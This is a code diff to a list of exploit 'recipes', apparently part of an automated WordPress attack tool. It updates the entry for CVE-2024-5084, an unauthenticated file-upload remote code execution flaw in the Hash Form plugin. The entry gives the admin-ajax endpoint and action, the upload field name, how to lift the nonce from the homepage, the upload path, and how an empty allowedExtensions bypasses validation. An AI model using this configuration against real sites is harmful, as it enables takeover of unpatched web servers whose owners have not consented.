@@ -286,14 +286,16 @@ RECIPES = [
         "method": "POST",
         "endpoint": "/wp-admin/admin-ajax.php",
         "params": {"action": "hash_form_upload"},
-        "field": "file",
-        "upload_path": "/wp-content/uploads/hash-form/{filename}",
-        "payload_type": "file-upload-no-validation",
+        "field": "qqfile",
+        "nonce_from": {"url": "/", "key": "ajax_nounce"},
+        "upload_path": "/wp-content/uploads/hashform-uploads/temp/{filename}",
+        "payload_type": "file-upload-nonce-bypass",
         "source": "registry",
         "note": "Unauth arbitrary file upload RCE (CVE-2024-5084, Hash Form <=1.1.0): "
-                "file_upload_action() has zero file type validation. Accepts .php directly. "
-                "No auth, plugin abandoned (no patch). CVSS 10.0 (perfect score). "
-                "Metasploit module available.",
+                "file_upload_action() passes allowedExtensions directly from user input "
+                "to the uploader; empty allowedExtensions bypasses all validation. Nonce "
+                "is public on homepage. No auth, plugin abandoned. CVSS 10.0. "
+                "Upload endpoint: /wp-admin/admin-ajax.php?action=hash_form_upload",
     },
     {
         "plugin": "wp-file-upload",
